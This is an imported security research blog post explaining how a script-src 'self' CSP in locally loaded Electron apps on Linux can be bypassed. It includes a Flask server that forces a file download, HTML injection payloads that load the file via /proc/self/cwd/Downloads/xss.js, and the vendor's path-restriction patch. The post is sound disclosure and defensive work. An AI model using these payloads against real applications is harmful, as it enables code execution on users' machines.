---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-04_linux-local-electron-application-script-src-self-bypass.md
original_filename: 2023-07-04_linux-local-electron-application-script-src-self-bypass.md
title: 'Linux local electron application script-src: self bypass'
category: documents
detected_topics:
- xss
- sso
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- sso
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: ea3180218de59de1be2cf428c62b825d4bcad3fdb0f905aca304c71c2a9359b7
text_sha256: ee72e6fa03b0d850220c062045ccc4b2516292b5ba86566075745d590d85be11
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Linux local electron application script-src: self bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-04_linux-local-electron-application-script-src-self-bypass.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `ea3180218de59de1be2cf428c62b825d4bcad3fdb0f905aca304c71c2a9359b7`
- Text SHA256: `ee72e6fa03b0d850220c062045ccc4b2516292b5ba86566075745d590d85be11`


## Content

---
title: "Linux local electron application script-src: self bypass"
page_title: "Linux local electron application script-src: self bypass | mizu.re"
url: "https://mizu.re/post/linux-local-electron-application-script-src-self-bypass#final_bypass"
final_url: "https://mizu.re/post/linux-local-electron-application-script-src-self-bypass#final_bypass"
authors: ["Mizu (@kevin_mizu)"]
bugs: ["Electron", "CSP bypass", "XSS", "RCE"]
publication_date: "2023-07-04"
added_date: "2023-07-12"
source: "pentester.land/writeups.json"
original_index: 968
---

[/mizu.re](https://mizu.re/)

  * _search_ _close_

  * _arrow_drop_down_ /articles
  * [/EJS_RCE_Gadget](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
  * [/Electron_XSS_RCE](https://slides.com/kevin-mizu/electron-cve-2022-3133)
  * [/Root_me_XSS](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org)
  *  _arrow_drop_down_ /writeups
  * [/HeroCTFv5](https://mizu.re/tag/HeroCTF_v5)
  * [/FCSC_2023](https://mizu.re/tag/FCSC2023)
  * [/FCSC_2022](https://mizu.re/tag/FCSC2022)
  * [/RootMe_10k](https://mizu.re/tag/10kCTF_RootMe)
  * [/Yogosha2022](https://mizu.re/tag/YogoshaChristmas_2022)
  * [/EC2_2021](https://mizu.re/tag/EC2_2021)
  *  _arrow_drop_down_ /cve
  * [CVE-2023-3975](https://nvd.nist.gov/vuln/detail/CVE-2023-3975)
  * [CVE-2023-3974](https://nvd.nist.gov/vuln/detail/CVE-2023-3974)
  * [CVE-2023-3973](https://nvd.nist.gov/vuln/detail/CVE-2023-3973)
  * [CVE-2022-3133](https://nvd.nist.gov/vuln/detail/CVE-2022-3133)
  * [CVE-2022-3127](https://nvd.nist.gov/vuln/detail/CVE-2022-3127)
  * [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/CVE-2022-29361)
  * [CVE-2022-2342](https://nvd.nist.gov/vuln/detail/CVE-2022-2342)
  * [CVE-2022-1850](https://nvd.nist.gov/vuln/detail/CVE-2022-1850)
  * [CVE-2022-1849](https://nvd.nist.gov/vuln/detail/CVE-2022-1849)
  * [/whoami](https://mizu.re/whoami)
  * _brightness_7_

  * _search_ _close_

  *  * /articles
  * [𑁋 /EJS_RCE_Gadget](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)
  * [𑁋 /Electron_XSS_RCE](https://slides.com/kevin-mizu/electron-cve-2022-3133)
  * [𑁋 /Root_me_XSS](https://mizu.re/post/how-i-was-able-to-rick-roll-every-users-on-root-me.org)
  *  *  * /writeups
  * [𑁋 /HeroCTFv5](https://mizu.re/tag/HeroCTF_v5)
  * [𑁋 /FCSC_2023](https://mizu.re/tag/FCSC2023)
  * [𑁋 /FCSC_2022](https://mizu.re/tag/FCSC2022)
  * [𑁋 /RootMe_10k](https://mizu.re/tag/10kCTF_RootMe)
  * [𑁋 /Yogosha2022](https://mizu.re/tag/YogoshaChristmas_2022)
  * [𑁋 /EC2_2021](https://mizu.re/tag/EC2_2021)
  *  *  * /cve
  * [𑁋 CVE-2023-3975](https://nvd.nist.gov/vuln/detail/CVE-2023-3975)
  * [𑁋 CVE-2023-3974](https://nvd.nist.gov/vuln/detail/CVE-2023-3974)
  * [𑁋 CVE-2023-3973](https://nvd.nist.gov/vuln/detail/CVE-2023-3973)
  * [𑁋 CVE-2022-3133](https://nvd.nist.gov/vuln/detail/CVE-2022-3133)
  * [𑁋 CVE-2022-3127](https://nvd.nist.gov/vuln/detail/CVE-2022-3127)
  * [𑁋 CVE-2022-29361](https://nvd.nist.gov/vuln/detail/CVE-2022-29361)
  * [𑁋 CVE-2022-2342](https://nvd.nist.gov/vuln/detail/CVE-2022-2342)
  * [𑁋 CVE-2022-1850](https://nvd.nist.gov/vuln/detail/CVE-2022-1850)
  * [𑁋 CVE-2022-1849](https://nvd.nist.gov/vuln/detail/CVE-2022-1849)
  *  * [/whoami](https://mizu.re/whoami)

_menu_

_keyboard_arrow_up_

[mizu.re](https://mizu.re/) [post](https://mizu.re/posts/) [Linux local electron application script-src: self bypass]()

  

title: Linux local electron application script-src: self bypass  
date: Jul 04, 2023  
tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web) [XSS](https://mizu.re/tag/XSS)

  

# Linux local electron application script-src: self bypass

  

  * 📜 Introduction
  * ⚛️ What is electron?
  * 👷 How does it works?
  * 💃 Basic example of local application
  * ⚡ Why XSS are more dangerous on electron application?
  * 📝 shell.openExternal and auto download features
  * 🔎 Finding the script without knowing the path
  * 💥 Final bypass
  * 🩹 Patch the issue

  

## 📜 Introduction

While searching for XSS to RCE exploit chain on the [draw.io desktop](https://github.com/jgraph/drawio-desktop) electron application, I faced a situation where I was able to get an HTML injection which wasn't sanitized but blocked by a script-src: self CSP. The specificity of this application is that everything is loaded locally using loadFile (it could be either loadUrl with file://). At the moment of my vulnerability research, as far as I know, there was no universal way to bypass this CSP in this specific context (except file://smb-host/share/xss.js which is not working anymore if the user didn't connect once on the share before). After some times, I came up with an interesting idea that unfortunately wasn't working on [draw.io desktop](https://github.com/jgraph/drawio-desktop)... Therefore, since the approach was really interesting I decided to write this article to share the tricks with you.

If you already know what is electron, feel free to jump to the shell.openExternal part 😉

_In addition, for more information about electron security, you can check all great articles from[electrovolt](https://blog.electrovolt.io/) or my past draw.io exploitation [presentation](https://slides.com/kevin-mizu/electron-cve-2022-3133)!_

  

## ⚛️ What is electron?

Before all, what's electron? If we go to the to official website, we can get the following definition: 

> Electron is a framework for building desktop applications using JavaScript, HTML, and CSS. By embedding Chromium and Node.js into its binary, Electron allows you to maintain one JavaScript codebase and create cross-platform apps that work on Windows, macOS, and Linux.

Basically, electron library will allow any developer to create an application which could be run easily on any platform including online website thanks to the embedded chromium driver.

_A non exhaustive list of application can be found here:[www.electronjs.org](https://www.electronjs.org/apps)._

  

## 👷 How does it works?

![electron-flow.png](https://mizu.re/articles/articles/electron_linux_local_csp_bypass/images/electron-flow.png)

**Fig. 1** : Electron communication flow.

  

## 💃 Basic example of local application

When developing an electron desktop application, there are two ways to do it:

  * locally: loadFile("file://path/to/file.html") or loadURL("file://path/to/file.html")
  * remotely: loadURL("https://domain.com/")

In this article we are going to focus on the on the first situation.
  
  
  const { app, BrowserWindow } = require('electron');
  
  function createWindow () {
  const win = new BrowserWindow({
  width: 800,
  height: 600
  })
  
  win.loadFile("file://index.html");
  }
  
  app.whenReady().then(() => {
  createWindow()
  })

**Fig. 2** : Example of local electron desktop application.

  

## ⚡ Why XSS are more dangerous on electron application?

As we can see on the 2nd part (how does it works?), renderer process can communicate with the main process thanks to inter-process communication ([IPC](https://www.electronjs.org/docs/latest/api/context-bridge)). Thus, thanks to an XSS it might be possible to communicate with them and potentially abuse back-end features to get an RCE.

_An example of such exploit can be found on[electrovolt](https://blog.electrovolt.io/) or inside my past draw.io exploitation [presentation](https://slides.com/kevin-mizu/electron-cve-2022-3133)!_

  

## 📝 shell.openExternal and auto download features

Now that we have a good overview about how does electron works, I'll try to explain my CSP bypass concept.

First of all, as said before, opening only trusted source inside an electron application is a mandatory to secure an application. To do so, developper uses the [shell.openExternal](https://www.electronjs.org/docs/latest/api/shell) function to open the link on the default user's browser navigator.
  
  
  // Open link / window on default user's navigator
  function openExternal(url) {
  if (url.startsWith("https://")) {
  shell.openExternal(url);
  return true;
  }
  return false;
  }
  
  app.on("web-contents-created", (event, contents) => {
  // Disable navigation
  contents.on("will-navigate", (event, navigationUrl) => {
  event.preventDefault()
  })
  
  // Limit new windows creation
  contents.setWindowOpenHandler(({ url }) => {
  openExternal(url);
  return {action: "deny"}
  })
  
  // Disable webviews
  contents.on("will-attach-webview", (event, webPreferences, params) => {
  event.preventDefault()
  })
  })

**Fig. 3** : Example of navigation handler using shell.openExternal. ([snippet source](https://github.com/jgraph/drawio-desktop/blob/d53ea438298fa476cdb6a22e2aa3e632e32f0ac1/src/main/electron.js#L1009))

But, what could goes wrong with this implementation? In fact, by default the electron's chromium driver isn't configured to auto download content. Therefore, it is not the case for classic chromium or firefox browsers in default configuration. That's why, in case of an HTML injection in the electron application, it might be possible to enforce the user downloading a file from his default browser. Thanks to this, we might be able to control a file in his default download folder which is most of the time /home/user/Downloads/uploaded-file.js on Linux.
  
  
  <a target="_blank" href="https://domain.com/auto-dl">Click Me</a>

**Fig. 4** : Force new window creating thanks to target="_blank"
  
  
  from flask import Flask, Response
  
  app = Flask(__name__)
  
  @app.route("/<path:path>")
  def index(path):
  return Response("""
  alert()
  """, mimetype="application/octet-stream;charset=utf-8")
  
  if __name__ == "__main__":
  app.run("0.0.0.0", 5001)

**Fig. 5** : Flask application to force auto download file.

![auto_download.gif](https://mizu.re/articles/articles/electron_linux_local_csp_bypass/images/auto_download.gif)

**Fig. 6** : Auto downloaded file thanks to shell.openExternal on electron applciation

  

## 🔎 Finding the script without knowing the path

Thanks to the previous section, we have a way to control a file on the victim's file system but, we have no information about his username. However, that's where I found interesting ways to load it without knowing it!

When you are using Linux and wanting to open an application, there are 2 principals ways: clicking a logo on your desktop or searching the app un your search bar. Something interesting about it, is that it is equivalent to:

**Open a terminal - > execute the binary (ie: chromium)**

What's the problem here? When doing it, the current process of the application has been open in the user's home folder. Thus, we can access downloaded files through /proc/self/cwd which point to /home/user!

![self_proc_cwd.png](https://mizu.re/articles/articles/electron_linux_local_csp_bypass/images/self_proc_cwd.png)

**Fig. 7** : Linux cwd symbolic link associated to /home/user due to icon click.

  

## 💥 Final bypass

The only problem with this approach is the fact the HTML injection must try to load the script tag after the user clicks on the auto download link... Maybe delay the script loading by other resources might fix it?
  
  
  <script src="/proc/self/cwd/Downloads/xss.js"></script>
  
  <!-- in case of a innerHTML sink -->
  <iframe srcdoc="<script src='/proc/self/cwd/Downloads/xss.js'></script>"></iframe>

![poc.gif](https://mizu.re/articles/articles/electron_linux_local_csp_bypass/images/poc.gif)

**Fig. 8** : Linux local XSS on chromium browser abusing auto download feature.

  

## 🩹 Patch the issue

I thinks that the way that [jgraph](https://github.com/jgraph/drawio-desktop) blocked this kind of attack is really interesting. In fact, they simply limit to a specific path, resources that can be loaded in the application:
  
  
  app.on("ready", e => {
  session.defaultSession.webRequest.onBeforeRequest({urls: ["file://*"]}, (details, callback) => {
  if (!details.url.startsWith(__dirname + "/limited/path")) {
  callback({cancel: true});
  } else {
  callback({});
  }
  });
  })

**Fig. 9** : Example of way to limit local resources loading in an electron application ([source](https://github.com/jgraph/drawio-desktop/blob/d53ea438298fa476cdb6a22e2aa3e632e32f0ac1/src/main/electron.js#L269))

  

[_keyboard_arrow_left_ Intigriti October 2023 - XSS Challenge](https://mizu.re/post/intigriti-october-2023-xss-challenge)

[Abusing Client-Side Desync on Werkzeug _keyboard_arrow_right_](https://mizu.re/post/abusing-client-side-desync-on-werkzeug)

##### [mizu.re](https://mizu.re/)

Mizu's website

##### Site map

  * [Home](https://mizu.re/)
  * [Posts](https://mizu.re/posts)
  * [Tags](https://mizu.re/tag)
  * [Whoami](https://mizu.re/whoami)

© 2021 Mizu [licences](https://mizu.re/licences)
